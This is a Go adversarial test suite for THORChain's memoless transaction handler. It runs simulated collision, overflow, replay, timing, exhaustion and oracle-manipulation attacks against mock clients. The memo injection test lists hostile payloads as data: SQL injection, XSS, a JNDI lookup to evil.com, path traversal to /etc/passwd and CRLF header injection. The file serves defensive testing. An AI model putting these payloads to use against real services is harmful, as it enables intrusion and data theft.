package observer

import (
	"context"
	"fmt"
	"math"
	"math/rand"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/blang/semver"
	"github.com/cosmos/cosmos-sdk/client"
	"github.com/stretchr/testify/suite"

	"gitlab.com/thorchain/thornode/v3/bifrost/thorclient"
	shareTypes "gitlab.com/thorchain/thornode/v3/bifrost/pkg/chainclients/shared/types"
	btypes "gitlab.com/thorchain/thornode/v3/bifrost/thorclient/types"
	"gitlab.com/thorchain/thornode/v3/common"
	"gitlab.com/thorchain/thornode/v3/common/cosmos"
	"gitlab.com/thorchain/thornode/v3/config"
	stypes "gitlab.com/thorchain/thornode/v3/x/thorchain/types"
)

// Adversarial testing suite for economic and cryptographic attacks
type MemolessAdversarialTestSuite struct {
	suite.Suite
	attackEngine    *AdversarialEngine
	memoHandler     *MemolessHandler
	attackScenarios []AdversarialScenario
	securityMetrics *SecurityMetrics
}

func TestMemolessAdversarialSuite(t *testing.T) {
	suite.Run(t, new(MemolessAdversarialTestSuite))
}

func (suite *MemolessAdversarialTestSuite) SetupTest() {
	suite.attackEngine = NewAdversarialEngine()
	adversarialBridge := NewAdversarialThorClient(suite.attackEngine)
	suite.memoHandler = NewMemolessHandler(adversarialBridge, NewTestLogger())

	suite.securityMetrics = &SecurityMetrics{
		startTime:         time.Now(),
		attacksAttempted:  0,
		attacksSuccessful: 0,
		vulnerabilities:   make(map[string]int),
		falsePositives:    0,
		falseNegatives:    0,
	}

	// Define adversarial attack scenarios
	suite.attackScenarios = []AdversarialScenario{
		{
			name:        "reference_collision_attack",
			description: "Attempt to register conflicting references",
			attackType:  ReferenceCollision,
			severity:    Critical,
			duration:    time.Minute * 3,
		},
		{
			name:        "amount_manipulation_attack",
			description: "Manipulate transaction amounts to bypass detection",
			attackType:  AmountManipulation,
			severity:    High,
			duration:    time.Minute * 2,
		},
		{
			name:        "memo_injection_attack",
			description: "Inject malicious content into resolved memos",
			attackType:  MemoInjection,
			severity:    High,
			duration:    time.Minute * 2,
		},
		{
			name:        "replay_attack",
			description: "Replay old memo registration transactions",
			attackType:  ReplayAttack,
			severity:    Medium,
			duration:    time.Minute * 1,
		},
		{
			name:        "timing_attack",
			description: "Exploit timing differences for information leakage",
			attackType:  TimingAttack,
			severity:    Medium,
			duration:    time.Minute * 4,
		},
		{
			name:        "resource_exhaustion_attack",
			description: "Exhaust system resources through memo spam",
			attackType:  ResourceExhaustion,
			severity:    High,
			duration:    time.Minute * 5,
		},
		{
			name:        "oracle_manipulation_attack",
			description: "Manipulate memo lookups through false oracle data",
			attackType:  OracleManipulation,
			severity:    Critical,
			duration:    time.Minute * 3,
		},
	}
}

func (suite *MemolessAdversarialTestSuite) TestAdversarialScenarios() {
	for _, scenario := range suite.attackScenarios {
		suite.Run(scenario.name, func() {
			suite.executeAdversarialScenario(scenario)
		})
	}
}

func (suite *MemolessAdversarialTestSuite) executeAdversarialScenario(scenario AdversarialScenario) {
	suite.T().Logf("🎯 Executing adversarial scenario: %s", scenario.name)
	suite.T().Logf("🔍 Description: %s", scenario.description)
	suite.T().Logf("⚠️  Severity: %s, Duration: %v", scenario.severity, scenario.duration)

	// Configure attack engine for this scenario
	suite.attackEngine.ConfigureAttack(scenario)

	// Start attack
	ctx, cancel := context.WithTimeout(context.Background(), scenario.duration)
	defer cancel()

	suite.attackEngine.StartAttack(ctx)
	defer suite.attackEngine.StopAttack()

	// Execute the specific attack scenario
	switch scenario.attackType {
	case ReferenceCollision:
		suite.executeReferenceCollisionAttack(ctx)
	case AmountManipulation:
		suite.executeAmountManipulationAttack(ctx)
	case MemoInjection:
		suite.executeMemoInjectionAttack(ctx)
	case ReplayAttack:
		suite.executeReplayAttack(ctx)
	case TimingAttack:
		suite.executeTimingAttack(ctx)
	case ResourceExhaustion:
		suite.executeResourceExhaustionAttack(ctx)
	case OracleManipulation:
		suite.executeOracleManipulationAttack(ctx)
	}

	// Analyze attack results and validate security
	suite.analyzeAttackResults(scenario)
	suite.validateSecurityInvariants(scenario)
}

func (suite *MemolessAdversarialTestSuite) executeReferenceCollisionAttack(ctx context.Context) {
	suite.T().Logf("🔥 Executing reference collision attack")

	// Attempt to create colliding references
	targetReference := "12345"

	// Try different collision strategies
	collisionStrategies := []string{
		"012345", // Leading zero variation
		"12345",  // Exact duplicate
		"1234",   // Truncated
		"123456", // Extended
		"١٢٣٤٥",  // Unicode digits (Arabic-Indic)
		"𝟏𝟐𝟑𝟒𝟓",  // Mathematical digits
	}

	successfulCollisions := 0
	for _, strategy := range collisionStrategies {
		select {
		case <-ctx.Done():
			return
		default:
			if suite.attemptReferenceCollision(targetReference, strategy) {
				successfulCollisions++
				atomic.AddInt64(&suite.securityMetrics.attacksSuccessful, 1)
				suite.securityMetrics.recordVulnerability("reference_collision")
			}
			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
		}
	}

	suite.T().Logf("📊 Reference collision results: %d/%d successful",
		successfulCollisions, len(collisionStrategies))
}

func (suite *MemolessAdversarialTestSuite) executeAmountManipulationAttack(ctx context.Context) {
	suite.T().Logf("🔥 Executing amount manipulation attack")

	// Test various amount manipulation techniques
	manipulationTests := []struct {
		name            string
		baseAmount      uint64
		manipulation    func(uint64) uint64
		expectDetection bool
	}{
		{
			name:       "integer_overflow",
			baseAmount: math.MaxUint64 - 100000,
			manipulation: func(base uint64) uint64 {
				return base + 99999 // Should cause overflow
			},
			expectDetection: false, // Should not be detected as memoless
		},
		{
			name:       "negative_amount_simulation",
			baseAmount: 50000,
			manipulation: func(base uint64) uint64 {
				return base // Will result in amount < 100000
			},
			expectDetection: false,
		},
		{
			name:       "precision_attack",
			baseAmount: 999999999,
			manipulation: func(base uint64) uint64 {
				return base*100000 + 99999 // Max reference
			},
			expectDetection: true,
		},
		{
			name:       "boundary_manipulation",
			baseAmount: 1,
			manipulation: func(base uint64) uint64 {
				return 100000 // Exactly at boundary
			},
			expectDetection: true,
		},
	}

	successfulManipulations := 0
	for _, test := range manipulationTests {
		select {
		case <-ctx.Done():
			return
		default:
			manipulatedAmount := test.manipulation(test.baseAmount)
			detected := suite.testAmountManipulation(test.name, manipulatedAmount, test.expectDetection)

			if detected != test.expectDetection {
				successfulManipulations++
				suite.securityMetrics.recordVulnerability("amount_manipulation")
			}

			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
		}
	}

	suite.T().Logf("📊 Amount manipulation results: %d unexpected detections", successfulManipulations)
}

func (suite *MemolessAdversarialTestSuite) executeMemoInjectionAttack(ctx context.Context) {
	suite.T().Logf("🔥 Executing memo injection attack")

	// Test memo injection payloads
	injectionPayloads := []string{
		"SWAP:BTC.BTC'; DROP TABLE memos; --", // SQL injection style
		"SWAP:<script>alert('xss')</script>",  // XSS style
		"SWAP:\x00\x01\x02\x03\x04",           // Binary injection
		"SWAP:" + string(make([]byte, 10000)), // Buffer overflow attempt
		"SWAP:${jndi:ldap://evil.com/a}",      // JNDI injection
		"../../../etc/passwd",                 // Path traversal
		"SWAP:%{#context}",                    // Template injection
		"SWAP:\r\nHOST: evil.com\r\n\r\n",     // Header injection
	}

	successfulInjections := 0
	for i, payload := range injectionPayloads {
		select {
		case <-ctx.Done():
			return
		default:
			reference := fmt.Sprintf("%05d", i+10000)
			if suite.attemptMemoInjection(reference, payload) {
				successfulInjections++
				suite.securityMetrics.recordVulnerability("memo_injection")
			}
			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
		}
	}

	suite.T().Logf("📊 Memo injection results: %d/%d successful",
		successfulInjections, len(injectionPayloads))
}

func (suite *MemolessAdversarialTestSuite) executeReplayAttack(ctx context.Context) {
	suite.T().Logf("🔥 Executing replay attack")

	// Create legitimate transaction first
	originalTx := &btypes.TxInItem{
		Tx:          "original-tx-replay-test",
		Coins:       common.Coins{common.NewCoin(common.RuneAsset(), cosmos.NewUint(100012345))},
		Memo:        "",
		BlockHeight: 144000,
	}

	// Process original transaction
	_, err := suite.memoHandler.ProcessMemolessTransaction(originalTx)
	if err != nil {
		suite.T().Logf("⚠️  Original transaction failed: %v", err)
		return
	}

	// Attempt replay attacks with variations
	replayVariations := []struct {
		name     string
		modifier func(*btypes.TxInItem) *btypes.TxInItem
	}{
		{
			name: "exact_replay",
			modifier: func(tx *btypes.TxInItem) *btypes.TxInItem {
				return tx // Exact same transaction
			},
		},
		{
			name: "height_modified_replay",
			modifier: func(tx *btypes.TxInItem) *btypes.TxInItem {
				newTx := *tx
				newTx.BlockHeight = tx.BlockHeight + 1
				return &newTx
			},
		},
		{
			name: "id_modified_replay",
			modifier: func(tx *btypes.TxInItem) *btypes.TxInItem {
				newTx := *tx
				newTx.Tx = "replayed-" + tx.Tx
				return &newTx
			},
		},
	}

	successfulReplays := 0
	for _, variation := range replayVariations {
		select {
		case <-ctx.Done():
			return
		default:
			replayTx := variation.modifier(originalTx)
			if suite.attemptReplayAttack(variation.name, replayTx) {
				successfulReplays++
				suite.securityMetrics.recordVulnerability("replay_attack")
			}
			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
		}
	}

	suite.T().Logf("📊 Replay attack results: %d/%d successful",
		successfulReplays, len(replayVariations))
}

func (suite *MemolessAdversarialTestSuite) executeTimingAttack(ctx context.Context) {
	suite.T().Logf("🔥 Executing timing attack")

	// Measure timing differences for various inputs
	timingMeasurements := make(map[string][]time.Duration)

	// Test different scenarios that might have timing differences
	scenarios := map[string]func() (*btypes.TxInItem, bool){
		"valid_memoless": func() (*btypes.TxInItem, bool) {
			return &btypes.TxInItem{
				Tx:          fmt.Sprintf("timing-valid-%d", rand.Intn(100000)),
				Coins:       common.Coins{common.NewCoin(common.RuneAsset(), cosmos.NewUint(100012345))},
				Memo:        "",
				BlockHeight: 144000,
			}, true
		},
		"invalid_memoless": func() (*btypes.TxInItem, bool) {
			return &btypes.TxInItem{
				Tx:          fmt.Sprintf("timing-invalid-%d", rand.Intn(100000)),
				Coins:       common.Coins{common.NewCoin(common.RuneAsset(), cosmos.NewUint(50000))},
				Memo:        "",
				BlockHeight: 144000,
			}, false
		},
		"nonexistent_reference": func() (*btypes.TxInItem, bool) {
			return &btypes.TxInItem{
				Tx:          fmt.Sprintf("timing-nonexistent-%d", rand.Intn(100000)),
				Coins:       common.Coins{common.NewCoin(common.RuneAsset(), cosmos.NewUint(100099999))},
				Memo:        "",
				BlockHeight: 144000,
			}, true // Will be detected as memoless but memo lookup will fail
		},
	}

	// Collect timing measurements
	samplesPerScenario := 100
	for scenarioName, generator := range scenarios {
		timingMeasurements[scenarioName] = make([]time.Duration, 0, samplesPerScenario)

		for i := 0; i < samplesPerScenario; i++ {
			select {
			case <-ctx.Done():
				goto analyze
			default:
				tx, _ := generator()

				start := time.Now()
				suite.memoHandler.ProcessMemolessTransaction(tx)
				duration := time.Since(start)

				timingMeasurements[scenarioName] = append(timingMeasurements[scenarioName], duration)
				atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
			}
		}
	}

analyze:
	// Analyze timing differences
	suite.analyzeTimingAttack(timingMeasurements)
}

func (suite *MemolessAdversarialTestSuite) executeResourceExhaustionAttack(ctx context.Context) {
	suite.T().Logf("🔥 Executing resource exhaustion attack")

	// Launch concurrent resource exhaustion attacks
	var wg sync.WaitGroup
	attackWorkers := 50
	requestsPerWorker := 1000

	startTime := time.Now()
	for worker := 0; worker < attackWorkers; worker++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			suite.runResourceExhaustionWorker(ctx, workerID, requestsPerWorker)
		}(worker)
	}

	// Monitor system resources during attack
	go suite.monitorResourceUsage(ctx)

	wg.Wait()
	duration := time.Since(startTime)

	totalRequests := int64(attackWorkers * requestsPerWorker)
	throughput := float64(totalRequests) / duration.Seconds()

	suite.T().Logf("📊 Resource exhaustion attack completed:")
	suite.T().Logf("   Duration: %v", duration)
	suite.T().Logf("   Total Requests: %d", totalRequests)
	suite.T().Logf("   Throughput: %.2f req/sec", throughput)

	// System should remain functional
	suite.validateSystemFunctionality()
}

func (suite *MemolessAdversarialTestSuite) executeOracleManipulationAttack(ctx context.Context) {
	suite.T().Logf("🔥 Executing oracle manipulation attack")

	// Configure adversarial oracle responses
	manipulationStrategies := []OracleManipulationConfig{
		{
			name:     "false_memo_content",
			strategy: FalseMemoResponse,
			payload:  "MALICIOUS:MEMO:CONTENT",
		},
		{
			name:     "delayed_response",
			strategy: DelayedOracleResponse,
			delay:    time.Second * 10,
		},
		{
			name:     "corrupted_metadata",
			strategy: CorruptedMetadata,
			payload:  "invalid_json_response",
		},
		{
			name:     "stale_data",
			strategy: StaleDataResponse,
			payload:  "expired_memo_content",
		},
	}

	successfulManipulations := 0
	for _, manipulation := range manipulationStrategies {
		select {
		case <-ctx.Done():
			return
		default:
			suite.attackEngine.ConfigureOracle(manipulation)

			if suite.testOracleManipulation(manipulation) {
				successfulManipulations++
				suite.securityMetrics.recordVulnerability("oracle_manipulation")
			}
			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
		}
	}

	suite.T().Logf("📊 Oracle manipulation results: %d/%d successful",
		successfulManipulations, len(manipulationStrategies))
}

// Attack validation methods

func (suite *MemolessAdversarialTestSuite) attemptReferenceCollision(target, collision string) bool {
	// Test if collision strategy bypasses reference validation
	utils := shareTypes.NewMemolessUtils()
	baseAmount := uint64(1000)

	// Try to create amount with colliding reference
	if len(collision) == 5 {
		testAmount := cosmos.NewUint(baseAmount*100000 + parseReference(collision))
		isMemoless, _, _ := utils.IsMemolessTransaction("", common.Coins{common.NewCoin(common.RuneAsset(), testAmount)})
		if !isMemoless {
			return false
		}
		extractedRef, err := utils.ExtractReferenceFromAmount(testAmount)
		return err == nil && extractedRef == target
	}

	return false
}

func (suite *MemolessAdversarialTestSuite) testAmountManipulation(testName string, amount uint64, expectDetection bool) bool {
	utils := shareTypes.NewMemolessUtils()
	testAmount := cosmos.NewUint(amount)
	isMemoless, _, _ := utils.IsMemolessTransaction("", common.Coins{common.NewCoin(common.RuneAsset(), testAmount)})
	suite.T().Logf("🧪 Amount manipulation test '%s': amount=%d, detected=%v, expected=%v",
		testName, amount, isMemoless, expectDetection)
	return isMemoless
}

func (suite *MemolessAdversarialTestSuite) attemptMemoInjection(reference, payload string) bool {
	// Configure attack engine to return malicious memo
	suite.attackEngine.SetMaliciousMemo(reference, payload)

	// Create test transaction
	baseAmount := uint64(1000)
	memolessAmount := baseAmount*100000 + parseReference(reference)

	tx := &btypes.TxInItem{
		Tx:          fmt.Sprintf("injection-test-%s", reference),
		Coins:       common.Coins{common.NewCoin(common.RuneAsset(), cosmos.NewUint(memolessAmount))},
		Memo:        "",
		BlockHeight: 144000,
	}

	// Process transaction and check if injection succeeded
	processedTx, err := suite.memoHandler.ProcessMemolessTransaction(tx)
	if err != nil {
		return false // Injection failed (good)
	}

	// Check if malicious content made it through
	return processedTx != nil && processedTx.Memo == payload
}

func (suite *MemolessAdversarialTestSuite) attemptReplayAttack(attackName string, replayTx *btypes.TxInItem) bool {
	// Process the replayed transaction
	processedTx, err := suite.memoHandler.ProcessMemolessTransaction(replayTx)

	// Replay should be detected and rejected
	if err != nil {
		suite.T().Logf("✅ Replay attack '%s' correctly rejected: %v", attackName, err)
		return false // Attack failed (good)
	}

	if processedTx != nil {
		suite.T().Logf("🚨 Replay attack '%s' succeeded - security vulnerability!", attackName)
		return true // Attack succeeded (bad)
	}

	return false
}

func (suite *MemolessAdversarialTestSuite) analyzeTimingAttack(measurements map[string][]time.Duration) {
	suite.T().Logf("📊 Timing attack analysis:")

	stats := make(map[string]TimingStats)

	for scenario, times := range measurements {
		if len(times) == 0 {
			continue
		}

		var total, min, max time.Duration
		min = time.Hour
		max = 0

		for _, duration := range times {
			total += duration
			if duration < min {
				min = duration
			}
			if duration > max {
				max = duration
			}
		}

		avg := total / time.Duration(len(times))

		stats[scenario] = TimingStats{
			samples: len(times),
			min:     min,
			max:     max,
			avg:     avg,
		}

		suite.T().Logf("   %s: avg=%v, min=%v, max=%v, samples=%d",
			scenario, avg, min, max, len(times))
	}

	// Check for suspicious timing patterns
	suite.detectTimingVulnerabilities(stats)
}

func (suite *MemolessAdversarialTestSuite) detectTimingVulnerabilities(stats map[string]TimingStats) {
	// Look for significant timing differences that could leak information
	timingRatios := make(map[string]float64)

	for scenario1, stats1 := range stats {
		for scenario2, stats2 := range stats {
			if scenario1 != scenario2 {
				ratio := float64(stats1.avg) / float64(stats2.avg)
				key := fmt.Sprintf("%s_vs_%s", scenario1, scenario2)
				timingRatios[key] = ratio

				if ratio > 2.0 || ratio < 0.5 {
					suite.T().Logf("⚠️  Potential timing vulnerability: %s (ratio: %.2f)", key, ratio)
					suite.securityMetrics.recordVulnerability("timing_side_channel")
				}
			}
		}
	}
}

func (suite *MemolessAdversarialTestSuite) runResourceExhaustionWorker(ctx context.Context, workerID, numRequests int) {
	for i := 0; i < numRequests; i++ {
		select {
		case <-ctx.Done():
			return
		default:
			// Create resource-intensive transaction
			reference := fmt.Sprintf("%05d", rand.Intn(100000))
			baseAmount := uint64(rand.Intn(1000000) + 1000)
			memolessAmount := baseAmount*100000 + parseReference(reference)

			tx := &btypes.TxInItem{
				Tx:          fmt.Sprintf("exhaust-%d-%d", workerID, i),
				Coins:       common.Coins{common.NewCoin(common.RuneAsset(), cosmos.NewUint(memolessAmount))},
				Memo:        "",
				BlockHeight: int64(144000 + rand.Intn(1000)),
			}

			suite.memoHandler.ProcessMemolessTransaction(tx)
			atomic.AddInt64(&suite.securityMetrics.attacksAttempted, 1)
		}
	}
}

func (suite *MemolessAdversarialTestSuite) monitorResourceUsage(ctx context.Context) {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			// Monitor resource usage (simplified)
			// In real implementation, would monitor CPU, memory, goroutines, etc.
		}
	}
}

func (suite *MemolessAdversarialTestSuite) validateSystemFunctionality() {
	// Test that system is still functional after resource exhaustion attack
	normalTx := &btypes.TxInItem{
		Tx:          "functionality-test-post-attack",
		Coins:       common.Coins{common.NewCoin(common.RuneAsset(), cosmos.NewUint(100054321))},
		Memo:        "",
		BlockHeight: 144000,
	}

	processedTx, err := suite.memoHandler.ProcessMemolessTransaction(normalTx)
	suite.Require().NoError(err, "System should remain functional after resource exhaustion attack")
	suite.Require().NotNil(processedTx, "Transaction processing should work after attack")
}

func (suite *MemolessAdversarialTestSuite) testOracleManipulation(manipulation OracleManipulationConfig) bool {
	// Create test transaction
	tx := &btypes.TxInItem{
		Tx:          fmt.Sprintf("oracle-test-%s", manipulation.name),
		Coins:       common.Coins{common.NewCoin(common.RuneAsset(), cosmos.NewUint(100012345))},
		Memo:        "",
		BlockHeight: 144000,
	}

	// Process with manipulated oracle
	processedTx, err := suite.memoHandler.ProcessMemolessTransaction(tx)

	// Check if manipulation succeeded
	switch manipulation.strategy {
	case FalseMemoResponse:
		return err == nil && processedTx != nil && processedTx.Memo == manipulation.payload
	case DelayedOracleResponse:
		// If it completed quickly, the delay didn't work
		return false
	case CorruptedMetadata:
		// Should either reject or handle gracefully
		return err == nil && processedTx != nil
	default:
		return false
	}
}

func (suite *MemolessAdversarialTestSuite) analyzeAttackResults(scenario AdversarialScenario) {
	attacksAttempted := atomic.LoadInt64(&suite.securityMetrics.attacksAttempted)
	attacksSuccessful := atomic.LoadInt64(&suite.securityMetrics.attacksSuccessful)

	if attacksAttempted == 0 {
		suite.T().Logf("⚠️  No attacks were attempted for scenario %s", scenario.name)
		return
	}

	successRate := float64(attacksSuccessful) / float64(attacksAttempted) * 100

	suite.T().Logf("📊 Attack Results for %s:", scenario.name)
	suite.T().Logf("   Attacks Attempted: %d", attacksAttempted)
	suite.T().Logf("   Attacks Successful: %d", attacksSuccessful)
	suite.T().Logf("   Success Rate: %.2f%%", successRate)

	// Log vulnerability breakdown
	if len(suite.securityMetrics.vulnerabilities) > 0 {
		suite.T().Logf("🔍 Vulnerabilities Discovered:")
		for vulnType, count := range suite.securityMetrics.vulnerabilities {
			suite.T().Logf("   %s: %d occurrences", vulnType, count)
		}
	}
}

func (suite *MemolessAdversarialTestSuite) validateSecurityInvariants(scenario AdversarialScenario) {
	attacksSuccessful := atomic.LoadInt64(&suite.securityMetrics.attacksSuccessful)

	// Define acceptable attack success thresholds based on severity
	var maxSuccessRate float64
	switch scenario.severity {
	case Critical:
		maxSuccessRate = 0.0 // No critical attacks should succeed
	case High:
		maxSuccessRate = 0.05 // Max 5% success rate for high severity
	case Medium:
		maxSuccessRate = 0.10 // Max 10% success rate for medium severity
	case Low:
		maxSuccessRate = 0.20 // Max 20% success rate for low severity
	}

	attacksAttempted := atomic.LoadInt64(&suite.securityMetrics.attacksAttempted)
	if attacksAttempted > 0 {
		actualSuccessRate := float64(attacksSuccessful) / float64(attacksAttempted)

		suite.Require().LessOrEqual(actualSuccessRate, maxSuccessRate,
			"🔴 Security invariant violated for %s: success rate %.2f%% exceeds threshold %.2f%%",
			scenario.name, actualSuccessRate*100, maxSuccessRate*100)
	}

	// Validate no critical vulnerabilities were found
	criticalVulns := []string{"reference_collision", "memo_injection", "oracle_manipulation"}
	for _, vuln := range criticalVulns {
		if count, exists := suite.securityMetrics.vulnerabilities[vuln]; exists && count > 0 {
			if scenario.severity == Critical {
				suite.T().Errorf("🔴 Critical vulnerability found: %s (%d occurrences)", vuln, count)
			} else {
				suite.T().Logf("⚠️  Vulnerability detected: %s (%d occurrences)", vuln, count)
			}
		}
	}

	suite.T().Logf("✅ Security invariants validated for %s", scenario.name)
}

// Supporting types and structures defined in memoless_test_utils.go

// OracleManipulationConfig represents an oracle attack configuration
type OracleManipulationConfig struct {
	name     string
	strategy OracleStrategy
	payload  string
	delay    time.Duration
}

type AdversarialEngine struct {
	activeAttacks  map[AttackType]bool
	maliciousMemos map[string]string
	oracleConfig   OracleManipulationConfig
	mu             sync.RWMutex
}

func NewAdversarialEngine() *AdversarialEngine {
	return &AdversarialEngine{
		activeAttacks:  make(map[AttackType]bool),
		maliciousMemos: make(map[string]string),
	}
}

func (ae *AdversarialEngine) ConfigureAttack(scenario AdversarialScenario) {
	ae.mu.Lock()
	defer ae.mu.Unlock()
	ae.activeAttacks[scenario.attackType] = true
}

func (ae *AdversarialEngine) StartAttack(ctx context.Context) {
	// Start background attack processes
}

func (ae *AdversarialEngine) StopAttack() {
	ae.mu.Lock()
	defer ae.mu.Unlock()
	ae.activeAttacks = make(map[AttackType]bool)
}

func (ae *AdversarialEngine) SetMaliciousMemo(reference, payload string) {
	ae.mu.Lock()
	defer ae.mu.Unlock()
	ae.maliciousMemos[reference] = payload
}

func (ae *AdversarialEngine) ConfigureOracle(manipulation OracleManipulationConfig) {
	ae.mu.Lock()
	defer ae.mu.Unlock()
	ae.oracleConfig = manipulation
}

// OracleManipulation and OracleStrategy types defined in memoless_test_utils.go

type AdversarialThorClient struct {
	*MockThorClient // Embed to inherit all interface methods
	attackEngine *AdversarialEngine
}

func NewAdversarialThorClient(engine *AdversarialEngine) *AdversarialThorClient {
	return &AdversarialThorClient{
		MockThorClient: NewMockThorClient(),
		attackEngine:   engine,
	}
}

func (atc *AdversarialThorClient) Broadcast(msgs ...cosmos.Msg) (common.TxID, error) {
	// Mock implementation for testing
	return common.TxID("test-broadcast-tx"), nil
}

func (atc *AdversarialThorClient) GetRegisteredMemo(reference string) (*stypes.RegisteredMemo, error) {
	atc.attackEngine.mu.RLock()

	// Check for malicious memo injection
	if payload, exists := atc.attackEngine.maliciousMemos[reference]; exists {
		atc.attackEngine.mu.RUnlock()
		return &stypes.RegisteredMemo{
			Reference:    reference,
			Memo:         payload,
			ChainId:      "BTC",
			RegisteredAt: 100,
			ExpiresAt:    144100,
			Status:       "active",
		}, nil
	}

	// Check for oracle manipulation
	if atc.attackEngine.oracleConfig.strategy == DelayedOracleResponse {
		delay := atc.attackEngine.oracleConfig.delay
		atc.attackEngine.mu.RUnlock()
		time.Sleep(delay)
		return atc.MockThorClient.GetRegisteredMemo(reference)
	}

	atc.attackEngine.mu.RUnlock()
	return atc.MockThorClient.GetRegisteredMemo(reference)
}

// Implement required ThorchainBridge interface methods
func (atc *AdversarialThorClient) EnsureNodeWhitelisted() error {
	return nil
}

func (atc *AdversarialThorClient) EnsureNodeWhitelistedWithTimeout() error {
	return nil
}

func (atc *AdversarialThorClient) FetchNodeStatus() (stypes.NodeStatus, error) {
	return stypes.NodeStatus_Active, nil
}

func (atc *AdversarialThorClient) FetchActiveNodes() ([]common.PubKey, error) {
	return []common.PubKey{}, nil
}

func (atc *AdversarialThorClient) GetAsgards() (stypes.Vaults, error) {
	return stypes.Vaults{}, nil
}

func (atc *AdversarialThorClient) GetVault(pubkey string) (stypes.Vault, error) {
	return stypes.Vault{}, nil
}

func (atc *AdversarialThorClient) GetConfig() config.BifrostClientConfiguration {
	return config.BifrostClientConfiguration{}
}

func (atc *AdversarialThorClient) GetConstants() (map[string]int64, error) {
	return make(map[string]int64), nil
}

func (atc *AdversarialThorClient) GetContext() client.Context {
	return client.Context{}
}

func (atc *AdversarialThorClient) GetContractAddress() ([]thorclient.PubKeyContractAddressPair, error) {
	return []thorclient.PubKeyContractAddressPair{}, nil
}

func (atc *AdversarialThorClient) GetErrataMsg(txID common.TxID, chain common.Chain) cosmos.Msg {
	return nil
}

func (atc *AdversarialThorClient) GetKeygenStdTx(poolPubKey common.PubKey, secp256k1Signature, keysharesBackup []byte, blame []stypes.Blame, inputPks common.PubKeys, keygenType stypes.KeygenType, chains common.Chains, height, keygenTime int64, poolPubKeyEddsa common.PubKey, keysharesBackupEddsa []byte) (cosmos.Msg, error) {
	return nil, nil
}

func (atc *AdversarialThorClient) GetKeysignParty(vaultPubKey common.PubKey) (common.PubKeys, error) {
	return common.PubKeys{}, nil
}

func (atc *AdversarialThorClient) GetMimir(key string) (int64, error) {
	return 0, nil
}

func (atc *AdversarialThorClient) GetMimirWithRef(template, ref string) (int64, error) {
	return 0, nil
}

func (atc *AdversarialThorClient) GetInboundOutbound(txIns common.ObservedTxs) (common.ObservedTxs, common.ObservedTxs, error) {
	return common.ObservedTxs{}, common.ObservedTxs{}, nil
}

func (atc *AdversarialThorClient) GetPools() (stypes.Pools, error) {
	return stypes.Pools{}, nil
}

func (atc *AdversarialThorClient) GetPubKeys() ([]thorclient.PubKeyContractAddressPair, error) {
	return []thorclient.PubKeyContractAddressPair{}, nil
}

func (atc *AdversarialThorClient) GetAsgardPubKeys() ([]thorclient.PubKeyContractAddressPair, error) {
	return []thorclient.PubKeyContractAddressPair{}, nil
}

func (atc *AdversarialThorClient) GetSolvencyMsg(height int64, chain common.Chain, pubKey common.PubKey, coins common.Coins) *stypes.MsgSolvency {
	return nil
}

func (atc *AdversarialThorClient) GetTHORName(name string) (stypes.THORName, error) {
	return stypes.THORName{}, nil
}

func (atc *AdversarialThorClient) GetThorchainVersion() (semver.Version, error) {
	return semver.Version{}, nil
}

func (atc *AdversarialThorClient) IsCatchingUp() (bool, error) {
	return false, nil
}

func (atc *AdversarialThorClient) HasNetworkFee(chain common.Chain) (bool, error) {
	return false, nil
}

func (atc *AdversarialThorClient) GetNetworkFee(chain common.Chain) (transactionSize, transactionFeeRate uint64, err error) {
	return 0, 0, nil
}

func (atc *AdversarialThorClient) PostKeysignFailure(blame stypes.Blame, height int64, memo string, coins common.Coins, pubkey common.PubKey) (common.TxID, error) {
	return common.TxID(""), nil
}

func (atc *AdversarialThorClient) PostNetworkFee(height int64, chain common.Chain, transactionSize, transactionRate uint64) (common.TxID, error) {
	return common.TxID(""), nil
}

func (atc *AdversarialThorClient) RagnarokInProgress() (bool, error) {
	return false, nil
}

func (atc *AdversarialThorClient) WaitToCatchUp() error {
	return nil
}

func (atc *AdversarialThorClient) GetBlockHeight() (int64, error) {
	return 100, nil
}

func (atc *AdversarialThorClient) GetLastObservedInHeight(chain common.Chain) (int64, error) {
	return 100, nil
}

func (atc *AdversarialThorClient) GetLastSignedOutHeight(chain common.Chain) (int64, error) {
	return 100, nil
}

func (atc *AdversarialThorClient) GetKeysign(blockHeight int64, pk string) (btypes.TxOut, error) {
	return btypes.TxOut{}, nil
}

func (atc *AdversarialThorClient) GetNodeAccount(nodeAddr string) (*stypes.NodeAccount, error) {
	return &stypes.NodeAccount{}, nil
}

func (atc *AdversarialThorClient) GetNodeAccounts() ([]*stypes.NodeAccount, error) {
	return []*stypes.NodeAccount{}, nil
}

func (atc *AdversarialThorClient) GetKeygenBlock(height int64, pk string) (stypes.KeygenBlock, error) {
	return stypes.KeygenBlock{}, nil
}

func parseReference(ref string) uint64 {
	var result uint64
	for _, char := range ref {
		if char >= '0' && char <= '9' {
			result = result*10 + uint64(char-'0')
		}
	}
	return result
}
